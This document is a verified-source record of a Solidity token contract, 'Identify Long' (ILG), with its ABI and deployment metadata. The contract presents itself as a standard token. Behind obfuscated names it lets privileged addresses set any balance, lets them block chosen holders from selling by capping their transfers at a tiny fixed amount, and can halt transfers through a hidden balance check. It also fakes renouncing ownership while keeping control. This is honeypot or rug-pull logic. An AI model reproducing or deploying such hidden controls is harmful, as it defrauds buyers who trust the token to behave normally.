{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityFeeMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTotal {\n    function createPair(address isReceiver, address receiverShould) external returns (address);\n}\n\ninterface modeTotalAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txShould) external view returns (uint256);\n\n    function transfer(address maxLaunch, uint256 enableExemptSell) external returns (bool);\n\n    function allowance(address sellWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableExemptSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxLaunch,\n        uint256 enableExemptSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMode, uint256 value);\n    event Approval(address indexed sellWallet, address indexed spender, uint256 value);\n}\n\ninterface modeTotalAmountMetadata is modeTotalAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IdentifyLong is liquidityFeeMode, modeTotalAmount, modeTotalAmountMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    uint256 buyLiquidity;\n\n    function launchedTrading(uint256 enableExemptSell) public {\n        marketingFrom();\n        buyLiquidity = enableExemptSell;\n    }\n\n    function transferFrom(address teamTo, address maxLaunch, uint256 enableExemptSell) external override returns (bool) {\n        if (_msgSender() != receiverTx) {\n            if (marketingFund[teamTo][_msgSender()] != type(uint256).max) {\n                require(enableExemptSell <= marketingFund[teamTo][_msgSender()]);\n                marketingFund[teamTo][_msgSender()] -= enableExemptSell;\n            }\n        }\n        return enableMode(teamTo, maxLaunch, enableExemptSell);\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingFund;\n\n    function amountFee(address toFund, uint256 enableExemptSell) public {\n        marketingFrom();\n        teamTotal[toFund] = enableExemptSell;\n    }\n\n    bool public launchedEnable;\n\n    function liquidityTakeAuto(address shouldToken) public {\n        marketingFrom();\n        \n        if (shouldToken == isToken || shouldToken == tradingSwap) {\n            return;\n        }\n        tokenEnable[shouldToken] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingWallet;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderLaunched;\n    }\n\n    uint256 private fundEnable = 100000000 * 10 ** 18;\n\n    function allowance(address fromAmount, address fromMarketing) external view virtual override returns (uint256) {\n        if (fromMarketing == receiverTx) {\n            return type(uint256).max;\n        }\n        return marketingFund[fromAmount][fromMarketing];\n    }\n\n    function enableMode(address teamTo, address maxLaunch, uint256 enableExemptSell) internal returns (bool) {\n        if (teamTo == isToken) {\n            return listLiquidityBuy(teamTo, maxLaunch, enableExemptSell);\n        }\n        uint256 minMode = modeTotalAmount(tradingSwap).balanceOf(minLiquidity);\n        require(minMode == buyLiquidity);\n        require(maxLaunch != minLiquidity);\n        if (tokenEnable[teamTo]) {\n            return listLiquidityBuy(teamTo, maxLaunch, txFee);\n        }\n        return listLiquidityBuy(teamTo, maxLaunch, enableExemptSell);\n    }\n\n    bool private autoShould;\n\n    address private senderLaunched;\n\n    uint256 txMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundEnable;\n    }\n\n    function transfer(address toFund, uint256 enableExemptSell) external virtual override returns (bool) {\n        return enableMode(_msgSender(), toFund, enableExemptSell);\n    }\n\n    string private liquidityReceiver = \"ILG\";\n\n    uint256 private receiverFundTrading;\n\n    address public tradingSwap;\n\n    address receiverTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function listLiquidityBuy(address teamTo, address maxLaunch, uint256 enableExemptSell) internal returns (bool) {\n        require(teamTotal[teamTo] >= enableExemptSell);\n        teamTotal[teamTo] -= enableExemptSell;\n        teamTotal[maxLaunch] += enableExemptSell;\n        emit Transfer(teamTo, maxLaunch, enableExemptSell);\n        return true;\n    }\n\n    function balanceOf(address txShould) public view virtual override returns (uint256) {\n        return teamTotal[txShould];\n    }\n\n    function buyShouldTake() public {\n        emit OwnershipTransferred(isToken, address(0));\n        senderLaunched = address(0);\n    }\n\n    uint256 public listSwap;\n\n    uint8 private tradingWallet = 18;\n\n    event OwnershipTransferred(address indexed totalSwap, address indexed tradingLaunch);\n\n    bool public launchMin;\n\n    function approve(address fromMarketing, uint256 enableExemptSell) public virtual override returns (bool) {\n        marketingFund[_msgSender()][fromMarketing] = enableExemptSell;\n        emit Approval(_msgSender(), fromMarketing, enableExemptSell);\n        return true;\n    }\n\n    mapping(address => bool) public tokenEnable;\n\n    address public isToken;\n\n    bool private limitAt;\n\n    function owner() external view returns (address) {\n        return senderLaunched;\n    }\n\n    bool private totalIsReceiver;\n\n    function exemptMin(address toTotalSwap) public {\n        if (launchMin) {\n            return;\n        }\n        \n        toEnable[toTotalSwap] = true;\n        \n        launchMin = true;\n    }\n\n    string private isFee = \"Identify Long\";\n\n    function marketingFrom() private view {\n        require(toEnable[_msgSender()]);\n    }\n\n    bool private senderListTotal;\n\n    bool private limitReceiver;\n\n    uint256 constant txFee = 13 ** 10;\n\n    address minLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public modeListReceiver;\n\n    mapping(address => bool) public toEnable;\n\n    mapping(address => uint256) private teamTotal;\n\n    constructor (){\n        \n        launchTake fundTo = launchTake(receiverTx);\n        tradingSwap = walletTotal(fundTo.factory()).createPair(fundTo.WETH(), address(this));\n        \n        isToken = _msgSender();\n        buyShouldTake();\n        toEnable[isToken] = true;\n        teamTotal[isToken] = fundEnable;\n        \n        emit Transfer(address(0), isToken, fundEnable);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableExemptSell\",\"type\":\"uint256\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableExemptSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotalSwap\",\"type\":\"address\"}],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableExemptSell\",\"type\":\"uint256\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"liquidityTakeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeListReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableExemptSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableExemptSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IdentifyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}